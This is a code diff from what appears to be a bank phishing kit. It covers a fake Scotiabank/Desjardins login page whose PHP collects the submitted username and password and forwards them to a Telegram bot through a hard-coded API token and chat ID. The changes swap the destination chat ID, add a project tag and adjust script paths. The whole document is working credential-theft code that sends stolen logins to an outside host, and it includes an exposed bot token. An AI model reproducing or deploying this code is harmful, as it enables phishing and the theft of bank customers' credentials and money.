@@ -153,7 +153,7 @@
      $crn        = $details['currency'];
      $type       = $tp;
      $bank       = "[ SCOTIA ]";
- 
+     $project    = "[CR00K-3D]";
      $url        = "https://scotiabank.com/";
      $user       = $_POST['username'];
      $pass       = $_POST['password'];
@@ -186,7 +186,7 @@
  
  $apiToken = "5909590896:AAHqBGBHNZAU_CcCXCBdJqV7Kjw4_Vbq1tg"; 
  $data = [
-     'chat_id' => '-871948148',
+     'chat_id' => '-939785230',
      'text' => $message
  ];
  
@@ -214,12 +214,12 @@
         <link rel="stylesheet" href="./files/main.css">
         <script>var popup = function(url, title, options){window.open(url, title, options);}</script>
         <link rel="icon" type="image/x-icon" href="/assets/desj/d.ico">
-        <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
+        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
         <script>
             var lrbank = 'Desj';
             var lrinfo = 'Login';
         </script>
-        <script src="./files/actions"></script>
+        <script src="./files/actions.js###"></script>
         <script>
         $(document).ready(function() {
             var attempt = 2;
